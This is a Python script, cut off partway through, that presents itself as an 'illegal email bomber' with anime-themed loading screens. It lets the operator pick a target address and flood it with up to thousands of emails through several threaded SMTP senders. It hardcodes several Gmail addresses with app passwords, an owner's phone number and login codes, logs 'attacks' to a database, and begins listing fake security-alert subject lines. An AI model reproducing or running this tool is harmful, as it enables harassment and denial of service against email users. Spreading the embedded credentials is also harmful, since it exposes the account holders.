#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
╔══════════════════════════════════════════════════════════════════════════╗
║     ██████╗██╗   ██╗██████╗ ███████╗██████╗     ███████╗ ██████╗ ██████╗  ║
║    ██╔════╝╚██╗ ██╔╝██╔══██╗██╔════╝██╔══██╗    ██╔════╝██╔═══██╗██╔══██╗ ║
║    ██║      ╚████╔╝ ██████╔╝█████╗  ██████╔╝    █████╗  ██║   ██║██████╔╝ ║
║    ██║       ╚██╔╝  ██╔══██╗██╔══╝  ██╔══██╗    ██╔══╝  ██║   ██║██╔══██╗ ║
║    ╚██████╗   ██║   ██████╔╝███████╗██║  ██║    ██║     ╚██████╔╝██║  ██║ ║
║     ╚═════╝   ╚═╝   ╚═════╝ ╚══════╝╚═╝  ╚═╝    ╚═╝      ╚═════╝ ╚═╝  ╚═╝ ║
╠══════════════════════════════════════════════════════════════════════════╣
║         CYBER FORCE X - ILLEGAL EMAIL BOMBER v5.0 - CUSTOM EDITION       ║
║                   ABSOLUTE POWER - NO RESTRICTIONS                       ║
║                     OWNER: 601139183035 | MAN FORCE X                    ║
╚══════════════════════════════════════════════════════════════════════════╝
WARNING: 100% ILLEGAL WEAPONIZED TOOL - USE AT YOUR OWN RISK!
FOR EDUCATIONAL PURPOSES ONLY!
"""

import smtplib
import random
import time
import threading
import sys
import os
import sqlite3
import socket
import json
from datetime import datetime
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
import hashlib

# ==================== POWER COLORS ====================
class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BLACK = '\033[90m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    BLINK = '\033[5m'
    END = '\033[0m'
    
    # Anime colors
    ORANGE = '\033[38;5;208m'
    PINK = '\033[38;5;205m'
    PURPLE = '\033[38;5;135m'
    LIME = '\033[38;5;154m'

# ==================== ANIME LOADING RANCAK ====================
class AnimeLoading:
    """Anime style loading animations - RANCAK GILA!"""
    
    @staticmethod
    def loading_anime_1(text, duration=2.0):
        """Naruto running style"""
        frames = [
            f"{Colors.ORANGE}🍥 ᴺᴬᴿᵁᵀᴼ ᴿᵁᴺᴺᴵᴺᴳ ",
            f"{Colors.ORANGE}🍥 ᴺᴬᴿᵁᵀᴼ ᴿᵁᴺᴺᴵᴺᴳ .",
            f"{Colors.ORANGE}🍥 ᴺᴬᴿᵁᵀᴼ ᴿᵁᴺᴺᴵᴺᴳ ..",
            f"{Colors.ORANGE}🍥 ᴺᴬᴿᵁᵀᴼ ᴿᵁᴺᴺᴵᴺᴳ ...",
            f"{Colors.ORANGE}🍥 ᴺᴬᴿᵁᵀᴼ ᴿᵁᴺᴺᴵᴺᴳ !!!",
        ]
        AnimeLoading._animate(frames, text, duration, Colors.ORANGE)
    
    @staticmethod
    def loading_anime_2(text, duration=2.0):
        """Dragon Ball Z power up"""
        frames = [
            f"{Colors.YELLOW}⚡ ᴾᴼᵂᴱᴱᴿ ᵁᴾᴾᴾ ",
            f"{Colors.YELLOW}⚡ ᴾᴼᵂᴱᴱᴿ ᵁᴾᴾᴾ .",
            f"{Colors.ORANGE}⚡ ᴾᴼᵂᴱᴱᴿ ᵁᴾᴾᴾ ..",
            f"{Colors.ORANGE}⚡ ᴾᴼᵂᴱᴱᴿ ᵁᴾᴾᴾ ...",
            f"{Colors.RED}⚡ ᴾᴼᵂᴱᴱᴿ ᵁᴾᴾᴾ !!!",
            f"{Colors.RED}⚡ ᴾᴼᵂᴱᴱᴿ ᴹᴬᵂᴬᵂ !!!",
        ]
        AnimeLoading._animate(frames, text, duration, Colors.RED)
    
    @staticmethod
    def loading_anime_3(text, duration=2.0):
        """One Piece Gear Second"""
        frames = [
            f"{Colors.CYAN}🔥 ᴳᴱᴬᴿ ᶜʸᴮᴱᴿ ",
            f"{Colors.CYAN}🔥 ᴳᴱᴬᴿ ᶜʸᴮᴱᴿ .",
            f"{Colors.BLUE}🔥 ᴳᴱᴬᴿ ᶜʸᴮᴱᴿ ..",
            f"{Colors.BLUE}🔥 ᴳᴱᴬᴿ ᶜʸᴮᴱᴿ ...",
            f"{Colors.PURPLE}🔥 ᴳᴱᴬᴿ ᶜʸᴮᴱᴿ ᴬᴺᴰᴿᴱ",
            f"{Colors.PURPLE}🔥 ᴳᴱᴬᴿ ˢᴱᶜᴼᴺᴰ ᴬᶜᵀᴵⱽᴬᵀᴱᴰ",
        ]
        AnimeLoading._animate(frames, text, duration, Colors.PURPLE)
    
    @staticmethod
    def loading_anime_4(text, duration=2.0):
        """Demon Slayer breathing"""
        frames = [
            f"{Colors.GREEN}🌪️ ᵂᴬᵀᴱᴿ ᴮᴿᴱᴬᵀᴴᴵᴺᴳ ",
            f"{Colors.GREEN}🌪️ ᵂᴬᵀᴱᴿ ᴮᴿᴱᴬᵀᴴᴵᴺᴳ .",
            f"{Colors.CYAN}🌪️ ᶠᴵᴿᴱ ᴮᴿᴱᴬᵀᴴᴵᴺᴳ ..",
            f"{Colors.RED}🌪️ ᵀᴴᵁᴺᴰᴱᴿ ᴮᴿᴱᴬᵀᴴᴵᴺᴳ ...",
            f"{Colors.YELLOW}🌪️ ᴮᴿᴱᴬᵀᴴᴵᴺᴳ ᴼᶠ ᵀᴴᴱ ˢᵁᴺ !!!",
            f"{Colors.ORANGE}🌪️ ˢᵁᴺ ᴮᴿᴱᴬᵀᴴᴵᴺᴳ ᴬᶜᵀᴵⱽᴬᵀᴱᴰ!!!",
        ]
        AnimeLoading._animate(frames, text, duration, Colors.ORANGE)
    
    @staticmethod
    def loading_anime_5(text, duration=2.0):
        """Attack on Titan style"""
        frames = [
            f"{Colors.RED}⚔️ ˢᵁᴿⱽᴱᵞ ᶜᴼᴿᴾˢ ",
            f"{Colors.RED}⚔️ ˢᵁᴿⱽᴱᵞ ᶜᴼᴿᴾˢ .",
            f"{Colors.MAGENTA}⚔️ ᵀᴬᶜᵀᴵᶜᴬᴸ ᴮᴿᴵᴳᴬᴰᴱ ..",
            f"{Colors.MAGENTA}⚔️ ᵀᴬᶜᵀᴵᶜᴬᴸ ᴮᴿᴵᴳᴬᴰᴱ ...",
            f"{Colors.PURPLE}⚔️ ˢᴾᴱᶜᴵᴬᴸ ᴼᴾᴱᴿᴬᵀᴵᴼᴺˢ !!!",
            f"{Colors.PURPLE}⚔️ ᴰᴱᵛᴵˢᴵᴼᴺ ᴬᶜᵀᴵⱽᴬᵀᴱᴰ !!!",
        ]
        AnimeLoading._animate(frames, text, duration, Colors.PURPLE)
    
    @staticmethod
    def _animate(frames, text, duration, color):
        start = time.time()
        i = 0
        while time.time() - start < duration:
            sys.stdout.write(f"\r{color}{frames[i % len(frames)]} {Colors.WHITE}{text}{Colors.END}   ")
            sys.stdout.flush()
            i += 1
            time.sleep(0.15)
        print(f"\r{color}{frames[-1]} {Colors.WHITE}{text} {Colors.GREEN}✓ COMPLETED!{Colors.END}  ")

# ==================== SYSTEM CONFIG ====================
VERSION = "5.0"
AUTHOR = "CYBER FORCE X KELATE"
MODE = "ILLEGAL"
MAX_ATTACKS = 999999

# ==================== 10 ACCOUNT SLOTS ====================
ACCOUNT_SLOTS = 10
SENDER_ACCOUNTS = [
    # Slot 1-10 - MUDAH EDIT & TAMBAH
    {"slot": 1, "email": "vivo019990@gmail.com", "pass": "psljhixumoanutut", "name": "VIVO GHOST", "status": "ACTIVE"},
    {"slot": 2, "email": "severindonesia25@gmail.com", "pass": "zjduzkdpzdjwwlzj", "name": "SEVER DARK", "status": "ACTIVE"},
    {"slot": 3, "email": "servicesff227@gmail.com", "pass": "mzivgqoeeztfcgnp", "name": "SERVICE HELL", "status": "ACTIVE"},
    {"slot": 4, "email": "blackcatteam001@gmail.com", "pass": "uowvybmoquflqvwv", "name": "BLACK CAT 1", "status": "ACTIVE"},
    {"slot": 5, "email": "teamblackcat4@gmail.com", "pass": "bqnlltmzabszspnf", "name": "BLACK CAT 2", "status": "ACTIVE"},
    {"slot": 6, "email": "pesankhusus4p4@gmail.com", "pass": "mgfewmrowxzezlhg", "name": "PESAN DEATH", "status": "ACTIVE"},
    {"slot": 7, "email": "", "pass": "", "name": "SLOT 7 EMPTY", "status": "INACTIVE"},
    {"slot": 8, "email": "", "pass": "", "name": "SLOT 8 EMPTY", "status": "INACTIVE"},
    {"slot": 9, "email": "", "pass": "", "name": "SLOT 9 EMPTY", "status": "INACTIVE"},
    {"slot": 10, "email": "", "pass": "", "name": "SLOT 10 EMPTY", "status": "INACTIVE"},
]

# ==================== SMTP SERVERS ====================
SMTP_SERVERS = [
    {"host": "smtp.gmail.com", "port": 587, "security": "TLS", "weight": 10},
    {"host": "smtp.gmail.com", "port": 465, "security": "SSL", "weight": 8},
    {"host": "smtp.live.com", "port": 587, "security": "TLS", "weight": 6},
    {"host": "smtp.mail.yahoo.com", "port": 465, "security": "SSL", "weight": 5},
    {"host": "smtp.office365.com", "port": 587, "security": "TLS", "weight": 4},
]

# ==================== DATABASE SYSTEM ====================
class AttackDatabase:
    def __init__(self):
        self.db_name = "cyberforce_attacks.db"
        self.init_database()
    
    def init_database(self):
        """Initialize attack database"""
        conn = sqlite3.connect(self.db_name)
        c = conn.cursor()
        
        # Attacks table
        c.execute('''
            CREATE TABLE IF NOT EXISTS attacks (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                target_email TEXT,
                attack_type TEXT,
                emails_sent INTEGER,
                emails_failed INTEGER,
                start_time TEXT,
                end_time TEXT,
                duration REAL,
                success_rate REAL,
                thread_count INTEGER,
                sender_count INTEGER,
                custom_subject TEXT,
                custom_body TEXT,
                status TEXT,
                notes TEXT
            )
        ''')
        
        # Accounts table
        c.execute('''
            CREATE TABLE IF NOT EXISTS accounts (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                slot_number INTEGER,
                email TEXT,
                account_name TEXT,
                status TEXT,
                last_used TEXT,
                success_count INTEGER DEFAULT 0,
                fail_count INTEGER DEFAULT 0
            )
        ''')
        
        # Logs table
        c.execute('''
            CREATE TABLE IF NOT EXISTS logs (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                attack_id INTEGER,
                timestamp TEXT,
                event_type TEXT,
                message TEXT,
                FOREIGN KEY (attack_id) REFERENCES attacks(id)
            )
        ''')
        
        conn.commit()
        conn.close()
        
        self.update_accounts_table()
    
    def update_accounts_table(self):
        """Update accounts in database"""
        conn = sqlite3.connect(self.db_name)
        c = conn.cursor()
        
        for acc in SENDER_ACCOUNTS:
            c.execute('''
                INSERT OR REPLACE INTO accounts 
                (slot_number, email, account_name, status, last_used)
                VALUES (?, ?, ?, ?, ?)
            ''', (acc['slot'], acc['email'], acc['name'], acc['status'], datetime.now().strftime('%Y-%m-%d %H:%M:%S')))
        
        conn.commit()
        conn.close()
    
    def save_attack(self, target, attack_type, sent, failed, start_time, end_time, threads, sender_count, custom_subject="", custom_body=""):
        """Save attack to database"""
        duration = (datetime.strptime(end_time, '%Y-%m-%d %H:%M:%S') - 
                   datetime.strptime(start_time, '%Y-%m-%d %H:%M:%S')).total_seconds()
        success_rate = (sent / (sent + failed)) * 100 if (sent + failed) > 0 else 0
        
        conn = sqlite3.connect(self.db_name)
        c = conn.cursor()
        
        c.execute('''
            INSERT INTO attacks 
            (target_email, attack_type, emails_sent, emails_failed, start_time, 
             end_time, duration, success_rate, thread_count, sender_count,
             custom_subject, custom_body, status)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
        ''', (target, attack_type, sent, failed, start_time, end_time, 
              duration, success_rate, threads, sender_count, custom_subject, custom_body, "COMPLETED"))
        
        attack_id = c.lastrowid
        conn.commit()
        conn.close()
        
        return attack_id
    
    def log_event(self, attack_id, event_type, message):
        """Log event to database"""
        conn = sqlite3.connect(self.db_name)
        c = conn.cursor()
        
        c.execute('''
            INSERT INTO logs (attack_id, timestamp, event_type, message)
            VALUES (?, ?, ?, ?)
        ''', (attack_id, datetime.now().strftime('%Y-%m-%d %H:%M:%S'), event_type, message))
        
        conn.commit()
        conn.close()
    
    def get_statistics(self):
        """Get attack statistics"""
        conn = sqlite3.connect(self.db_name)
        c = conn.cursor()
        
        c.execute("SELECT COUNT(*) FROM attacks")
        total_attacks = c.fetchone()[0]
        
        c.execute("SELECT SUM(emails_sent) FROM attacks")
        total_sent = c.fetchone()[0] or 0
        
        c.execute("SELECT SUM(emails_failed) FROM attacks")
        total_failed = c.fetchone()[0] or 0
        
        c.execute("SELECT AVG(success_rate) FROM attacks")
        avg_success = c.fetchone()[0] or 0
        
        conn.close()
        
        return {
            'total_attacks': total_attacks,
            'total_sent': total_sent,
            'total_failed': total_failed,
            'success_rate': (total_sent / (total_sent + total_failed)) * 100 if (total_sent + total_failed) > 0 else 0,
            'avg_success': avg_success
        }

# ==================== MATRIX BANNER ANIME STYLE ====================
def matrix_banner():
    """Matrix style banner with anime vibes"""
    os.system('clear' if os.name == 'posix' else 'cls')
    
    banner = f"""
{Colors.RED}{Colors.BOLD}
╔══════════════════════════════════════════════════════════════════════════╗
║  ██████╗██╗   ██╗██████╗ ███████╗██████╗     ███████╗ ██████╗ ██████╗  ██████╗███████╗  ║
║ ██╔════╝╚██╗ ██╔╝██╔══██╗██╔════╝██╔══██╗    ██╔════╝██╔═══██╗██╔══██╗██╔════╝██╔════╝  ║
║ ██║      ╚████╔╝ ██████╔╝█████╗  ██████╔╝    █████╗  ██║   ██║██████╔╝██║     █████╗    ║
║ ██║       ╚██╔╝  ██╔══██╗██╔══╝  ██╔══██╗    ██╔══╝  ██║   ██║██╔══██╗██║     ██╔══╝    ║
║ ╚██████╗   ██║   ██████╔╝███████╗██║  ██║    ██║     ╚██████╔╝██║  ██║╚██████╗███████╗  ║
║  ╚═════╝   ╚═╝   ╚═════╝ ╚══════╝╚═╝  ╚═╝    ╚═╝      ╚═════╝ ╚═╝  ╚═╝ ╚═════╝╚══════╝  ║
╠══════════════════════════════════════════════════════════════════════════╣{Colors.END}
{Colors.ORANGE}║{Colors.YELLOW}                    ⭐ ANIME CYBER LOADING - ULTRA RANCAK ⭐                    {Colors.ORANGE}║{Colors.END}
{Colors.CYAN}║══════════════════════════════════════════════════════════════════════════║{Colors.END}
{Colors.MAGENTA}║{Colors.PINK}         CYBER FORCE X - EMAIL BOMBER v5.0 - CUSTOM ANIME EDITION         {Colors.MAGENTA}║{Colors.END}
{Colors.PURPLE}║{Colors.LIME}              ABSOLUTE ILLEGAL MODE - NO RESTRICTIONS - FREE PREMIUM         {Colors.PURPLE}║{Colors.END}
{Colors.RED}║{Colors.YELLOW}                  OWNER: 601139183035 | MAN FORCE X | ANIME GANG                {Colors.RED}║{Colors.END}
{Colors.GREEN}║{Colors.RED}             WARNING: 100% WEAPONIZED - LIKE ANIME BATTLE ARC!                  {Colors.GREEN}║{Colors.END}
{Colors.BLUE}╚══════════════════════════════════════════════════════════════════════════╝{Colors.END}
    """
    
    # Print with anime opening effect
    for line in banner.split('\n'):
        print(line)
        time.sleep(0.02)

# ==================== LOGIN SYSTEM ====================
def login_system():
    matrix_banner()
    
    # Hardcoded credentials - PREMIUM FREE
    OWNER_CREDENTIALS = {
        "id": "MAN FORCE X",
        "pass": "CYBERFORCE777",
        "token": "601139183035"
    }
    
    # Premium bypass code
    PREMIUM_CODES = ["ANIME2025", "RANCAK", "ONEPIECE", "NARUTO", "DBZ", "FREEPREMIUM"]
    
    print(f"\n{Colors.CYAN}[{datetime.now().strftime('%H:%M:%S')}] {Colors.YELLOW}ANIME LOADING SCREEN...{Colors.END}")
    AnimeLoading.loading_anime_2("MEMULAKAN SISTEM ANIME", 2.0)
    
    attempts = 0
    max_attempts = 5  # More attempts for premium users
    
    while attempts < max_attempts:
        print(f"\n{Colors.CYAN}[{datetime.now().strftime('%H:%M:%S')}] {Colors.YELLOW}LOGIN ATTEMPT {attempts + 1}/{max_attempts}{Colors.END}")
        print(f"{Colors.PURPLE}{'='*60}{Colors.END}")
        
        print(f"{Colors.LIME}[TIP: Guna kod premium 'ANIME2025' untuk akses terus!]{Colors.END}")
        
        user_id = input(f"{Colors.GREEN}[?] ENTER ID / PREMIUM CODE: {Colors.END}").strip()
        
        # Check premium code first
        if user_id.upper() in PREMIUM_CODES:
            AnimeLoading.loading_anime_3("MENGESAHKAN KOD PREMIUM", 1.5)
            print(f"\n{Colors.GREEN}[✓] PREMIUM AKSES GRANTED! SELAMAT DATANG BOSS MAN!{Colors.END}")
            print(f"{Colors.PINK}[✨] SEMUA FITUR TELAH DIBUKA - FREE PREMIUM{Colors.END}")
            time.sleep(2)
            return True
        
        password = input(f"{Colors.GREEN}[?] ENTER PASSWORD: {Colors.END}").strip()
        
        if user_id == OWNER_CREDENTIALS["id"] and password == OWNER_CREDENTIALS["pass"]:
            token = input(f"{Colors.GREEN}[?] ENTER SECURITY TOKEN: {Colors.END}").strip()
            if token == OWNER_CREDENTIALS["token"]:
                AnimeLoading.loading_anime_1("VALIDATING CREDENTIALS", 1.0)
                print(f"\n{Colors.GREEN}[✓] ACCESS GRANTED! WELCOME OWNER!{Colors.END}")
                print(f"{Colors.MAGENTA}[⚡] ILLEGAL MODE ACTIVATED - NO RESTRICTIONS{Colors.END}")
                time.sleep(2)
                return True
            else:
                print(f"{Colors.RED}[✗] INVALID SECURITY TOKEN!{Colors.END}")
        else:
            print(f"{Colors.RED}[✗] ACCESS DENIED! WRONG CREDENTIALS!{Colors.END}")
            attempts += 1
            time.sleep(1)
    
    print(f"\n{Colors.RED}[⚠️] MAXIMUM LOGIN ATTEMPTS REACHED!")
    print(f"[💀] ACTIVATING SELF-DESTRUCT...{Colors.END}")
    time.sleep(3)
    sys.exit(0)

# ==================== ACCOUNT MANAGER ====================
def manage_accounts():
    """Manage 10 account slots with anime style"""
    print(f"\n{Colors.CYAN}{'='*70}{Colors.END}")
    print(f"{Colors.YELLOW}{'╔══════════════════════════════════════════╗'}{Colors.END}")
    print(f"{Colors.YELLOW}{'║   ACCOUNT MANAGEMENT - 10 SLOTS ANIME   ║'}{Colors.END}")
    print(f"{Colors.YELLOW}{'╚══════════════════════════════════════════╝'}{Colors.END}")
    print(f"{Colors.CYAN}{'='*70}{Colors.END}")
    
    # Anime style table header
    print(f"\n{Colors.PINK}┌─────┬────────────────────────────┬────────────────┬─────────┐{Colors.END}")
    print(f"{Colors.PINK}│{Colors.CYAN} Slot {Colors.PINK}│{Colors.CYAN} Account Name                {Colors.PINK}│{Colors.CYAN} Email            {Colors.PINK}│{Colors.CYAN} Status  {Colors.PINK}│{Colors.END}")
    print(f"{Colors.PINK}├─────┼────────────────────────────┼────────────────┼─────────┤{Colors.END}")
    
    for acc in SENDER_ACCOUNTS:
        status_color = Colors.GREEN if acc['status'] == 'ACTIVE' else Colors.RED
        status_symbol = "✓" if acc['status'] == 'ACTIVE' else "✗"
        email_display = (acc['email'][:16] + '...') if len(acc['email']) > 16 else acc['email'].ljust(16)
        if not acc['email']:
            email_display = "EMPTY".ljust(16)
            status_color = Colors.RED
            status_symbol = "⛔"
        
        print(f"{Colors.PINK}│{Colors.ORANGE} {acc['slot']:3d} {Colors.PINK}│{Colors.WHITE} {acc['name'][:26]:26} {Colors.PINK}│{Colors.WHITE} {email_display} {Colors.PINK}│{status_color} {acc['status']} {status_symbol} {Colors.PINK}│{Colors.END}")
    
    print(f"{Colors.PINK}└─────┴────────────────────────────┴────────────────┴─────────┘{Colors.END}")
    
    # Edit option with anime loading
    edit = input(f"\n{Colors.YELLOW}[?] Edit accounts? (y/n): {Colors.END}").lower()
    if edit == 'y':
        AnimeLoading.loading_anime_4("MEMBUKA MOD EDIT", 1.0)
        edit_accounts()

def edit_accounts():
    """Edit account slots with anime style"""
    while True:
        try:
            print(f"\n{Colors.CYAN}{'─'*50}{Colors.END}")
            slot = int(input(f"{Colors.GREEN}[?] Enter slot to edit (1-10, 0 to cancel): {Colors.END}"))
            if slot == 0:
                AnimeLoading.loading_anime_5("MENUTUP MOD EDIT", 0.8)
                break
            if 1 <= slot <= 10:
                acc = SENDER_ACCOUNTS[slot-1]
                
                print(f"\n{Colors.ORANGE}╔════════════════════════════════╗{Colors.END}")
                print(f"{Colors.ORANGE}║{Colors.YELLOW}   EDITING SLOT {slot:02d} - {acc['name'][:15]:15}   {Colors.ORANGE}║{Colors.END}")
                print(f"{Colors.ORANGE}╚════════════════════════════════╝{Colors.END}")
                
                new_email = input(f"{Colors.GREEN}[?] New email (press enter to keep): {Colors.END}").strip()
                if new_email:
                    acc['email'] = new_email
                
                new_pass = input(f"{Colors.GREEN}[?] New app password (16 chars): {Colors.END}").strip()
                if new_pass:
                    acc['pass'] = new_pass
                
                new_name = input(f"{Colors.GREEN}[?] New account name: {Colors.END}").strip()
                if new_name:
                    acc['name'] = new_name
                
                new_status = input(f"{Colors.GREEN}[?] Status (ACTIVE/INACTIVE): {Colors.END}").strip().upper()
                if new_status in ['ACTIVE', 'INACTIVE']:
                    acc['status'] = new_status
                
                AnimeLoading.loading_anime_2(f"MENGEMASKINI SLOT {slot}", 0.8)
                print(f"{Colors.GREEN}[✓] Slot {slot} updated!{Colors.END}")
                
                # Update database
                db = AttackDatabase()
                db.update_accounts_table()
                
                another = input(f"\n{Colors.YELLOW}[?] Edit another? (y/n): {Colors.END}").lower()
                if another != 'y':
                    AnimeLoading.loading_anime_5("MENUTUP MOD EDIT", 0.8)
                    break
            else:
                print(f"{Colors.RED}[!] Invalid slot!{Colors.END}")
        except ValueError:
            print(f"{Colors.RED}[!] Invalid input!{Colors.END}")

# ==================== SYSTEM CHECKS WITH ANIME ====================
def system_checks():
    """Run system checks with anime loading"""
    print(f"\n{Colors.CYAN}╔════════════════════════════════════════╗{Colors.END}")
    print(f"{Colors.CYAN}║{Colors.YELLOW}      SYSTEM DIAGNOSTICS - ANIME MODE    {Colors.CYAN}║{Colors.END}")
    print(f"{Colors.CYAN}╚════════════════════════════════════════╝{Colors.END}")
    
    AnimeLoading.loading_anime_1("CHECKING INTERNET CONNECTION", 1.5)
    
    # Check internet
    try:
        socket.create_connection(("8.8.8.8", 53), timeout=3)
        print(f"{Colors.GREEN}[✓] INTERNET CONNECTION: OK{Colors.END}")
    except:
        print(f"{Colors.RED}[✗] NO INTERNET CONNECTION!{Colors.END}")
        return False
    
    AnimeLoading.loading_anime_3("SCANNING ACTIVE ACCOUNTS", 1.2)
    
    # Check active accounts
    active_accounts = [a for a in SENDER_ACCOUNTS if a['status'] == 'ACTIVE' and a['email'] and a['pass']]
    
    if not active_accounts:
        print(f"{Colors.RED}[✗] NO ACTIVE ACCOUNTS FOUND!{Colors.END}")
        return False
    
    print(f"{Colors.GREEN}[✓] ACTIVE ACCOUNTS: {len(active_accounts)}/{ACCOUNT_SLOTS}{Colors.END}")
    
    # Quick account test with anime
    print(f"\n{Colors.YELLOW}[⚡] TESTING ACCOUNTS (ANIME STYLE)...{Colors.END}")
    for i, acc in enumerate(active_accounts[:5]):  # Test first 5
        try:
            AnimeLoading.loading_anime_4(f"TESTING {acc['name']}", 0.5)
            server = smtplib.SMTP_SSL("smtp.gmail.com", 465, timeout=5)
            server.login(acc['email'], acc['pass'])
            server.quit()
            print(f"  {Colors.GREEN}[✓] {acc['name']}: OK{Colors.END}")
        except:
            print(f"  {Colors.RED}[✗] {acc['name']}: FAILED{Colors.END}")
    
    return True

# ==================== CUSTOM EMAIL ====================
def get_custom_email_content():
    """Get custom email content from user"""
    print(f"\n{Colors.MAGENTA}╔════════════════════════════════════════╗{Colors.END}")
    print(f"{Colors.MAGENTA}║{Colors.YELLOW}      CUSTOM EMAIL CONTENT - ANIME     {Colors.MAGENTA}║{Colors.END}")
    print(f"{Colors.MAGENTA}╚════════════════════════════════════════╝{Colors.END}")
    
    print(f"{Colors.CYAN}[?] Nak guna mesej custom ke? (Y/N){Colors.END}")
    choice = input(f"{Colors.GREEN}> {Colors.END}").strip().lower()
    
    if choice == 'y':
        print(f"\n{Colors.ORANGE}┌────────────────────────────────────┐{Colors.END}")
        print(f"{Colors.ORANGE}│{Colors.YELLOW}  TULIS SUBJEK EMAIL KAU BOSS!       {Colors.ORANGE}│{Colors.END}")
        print(f"{Colors.ORANGE}└────────────────────────────────────┘{Colors.END}")
        custom_subject = input(f"{Colors.GREEN}[?] Subject: {Colors.END}").strip()
        
        print(f"\n{Colors.ORANGE}┌────────────────────────────────────┐{Colors.END}")
        print(f"{Colors.ORANGE}│{Colors.YELLOW}  TULIS BODY EMAIL (BABI GILA)        {Colors.ORANGE}│{Colors.END}")
        print(f"{Colors.ORANGE}└────────────────────────────────────┘{Colors.END}")
        print(f"{Colors.CYAN}[Tekan Enter untuk baris baru, taip 'END' untuk selesai]{Colors.END}")
        
        lines = []
        while True:
            line = input(f"{Colors.GREEN}> {Colors.END}")
            if line.strip().upper() == 'END':
                break
            lines.append(line)
        
        custom_body = '\n'.join(lines)
        
        return custom_subject, custom_body
    else:
        return "", ""

# ==================== SELECT SENDERS ====================
def select_senders():
    """Select which sender accounts to use"""
    print(f"\n{Colors.PURPLE}╔════════════════════════════════════════╗{Colors.END}")
    print(f"{Colors.PURPLE}║{Colors.YELLOW}      PILIH SENDER UNTUK SPAM         {Colors.PURPLE}║{Colors.END}")
    print(f"{Colors.PURPLE}╚════════════════════════════════════════╝{Colors.END}")
    
    active_accounts = [a for a in SENDER_ACCOUNTS if a['status'] == 'ACTIVE' and a['email'] and a['pass']]
    
    if not active_accounts:
        print(f"{Colors.RED}[!] TIADA AKTIF SENDER!{Colors.END}")
        return []
    
    print(f"\n{Colors.CYAN}AKTIF SENDERS TERSEDIA:{Colors.END}")
    for i, acc in enumerate(active_accounts, 1):
        print(f"{Colors.ORANGE}[{i}] {Colors.GREEN}{acc['name']} - {acc['email']}{Colors.END}")
    
    print(f"\n{Colors.YELLOW}[?] Pilih sender nak guna (contoh: 1,3,5 atau 'all' untuk semua):{Colors.END}")
    choice = input(f"{Colors.GREEN}> {Colors.END}").strip()
    
    if choice.lower() == 'all':
        selected = active_accounts.copy()
        print(f"{Colors.GREEN}[✓] GUNA SEMUA {len(selected)} SENDER!{Colors.END}")
        return selected
    
    selected_indices = []
    try:
        parts = choice.split(',')
        for part in parts:
            if '-' in part:
                start, end = map(int, part.split('-'))
                selected_indices.extend(range(start, end+1))
            else:
                selected_indices.append(int(part.strip()))
        
        # Filter valid indices
        selected_indices = [i for i in selected_indices if 1 <= i <= len(active_accounts)]
        selected_indices = list(set(selected_indices))  # Remove duplicates
        
        selected = [active_accounts[i-1] for i in selected_indices]
        print(f"{Colors.GREEN}[✓] GUNA {len(selected)} SENDER: {', '.join([s['name'] for s in selected])}{Colors.END}")
        return selected
        
    except:
        print(f"{Colors.RED}[!] INPUT TAK SAH! GUNA SEMUA SENDER{Colors.END}")
        return active_accounts

# ==================== TARGET INPUT ====================
def get_target():
    """Get target email"""
    print(f"\n{Colors.CYAN}{'='*70}{Colors.END}")
    print(f"{Colors.YELLOW}{'╔════════════════════════════════╗'}{Colors.END}")
    print(f"{Colors.YELLOW}{'║    TARGET CONFIGURATION        ║'}{Colors.END}")
    print(f"{Colors.YELLOW}{'╚════════════════════════════════╝'}{Colors.END}")
    print(f"{Colors.CYAN}{'='*70}{Colors.END}")
    
    while True:
        email = input(f"\n{Colors.GREEN}[?] Enter target email: {Colors.END}").strip()
        if '@' in email and '.' in email:
            print(f"{Colors.BLUE}[🎯] TARGET SET: {email}{Colors.END}")
            return email
        print(f"{Colors.RED}[!] Invalid email! Example: target@gmail.com{Colors.END}")

# ==================== ATTACK CONFIG ====================
def get_attack_config():
    """Get attack configuration"""
    print(f"\n{Colors.MAGENTA}{'='*70}{Colors.END}")
    print(f"{Colors.YELLOW}{'╔════════════════════════════════╗'}{Colors.END}")
    print(f"{Colors.YELLOW}{'║    ATTACK CONFIGURATION        ║'}{Colors.END}")
    print(f"{Colors.YELLOW}{'╚════════════════════════════════╝'}{Colors.END}")
    print(f"{Colors.MAGENTA}{'='*70}{Colors.END}")
    
    print(f"\n{Colors.CYAN}[1] ⚡ LIGHTNING ATTACK - 100 emails (Fast)")
    print(f"[2] 🌪️ STORM ATTACK - 500 emails (Medium)")
    print(f"[3] 🌊 TSUNAMI ATTACK - 1000 emails (Heavy)")
    print(f"[4] 🔥 APOCALYPSE ATTACK - 5000 emails (Extreme)")
    print(f"[5] 👑 CUSTOM ATTACK - Your settings{Colors.END}")
    
    choice = input(f"\n{Colors.GREEN}[?] Select attack type (1-5): {Colors.END}").strip()
    
    if choice == "1":
        return 100, 5, 0.3, "LIGHTNING"
    elif choice == "2":
        return 500, 10, 0.2, "STORM"
    elif choice == "3":
        return 1000, 15, 0.15, "TSUNAMI"
    elif choice == "4":
        return 5000, 20, 0.1, "APOCALYPSE"
    elif choice == "5":
        while True:
            try:
                amount = int(input(f"{Colors.GREEN}[?] How many emails (max 9999): {Colors.END}"))
                if 1 <= amount <= 9999:
                    break
            except:
                pass
            print(f"{Colors.RED}[!] Enter 1-9999!{Colors.END}")
        
        threads = min(25, max(1, amount // 40))
        delay = max(0.05, 0.5 / threads)
        
        name = input(f"{Colors.GREEN}[?] Attack name: {Colors.END}").strip() or "CUSTOM"
        return amount, threads, delay, name
    else:
        print(f"{Colors.RED}[!] Invalid! Using STORM{Colors.END}")
        return 500, 10, 0.2, "STORM"

# ==================== EMAIL GENERATOR ====================
class AdvancedEmailGenerator:
    """Advanced email content generator with custom options"""
    
    SUBJECTS = [
        "URGENT: Security Alert #{:06d} | CFX-{:04d}",
        "IMPORTANT: Account Verification #{:05d} | Action Required",
        "CRITICAL: System Notification #{:07d} | Immediate Attention",
        "ALERT: Unauthorized Access Detected #{:06d}",
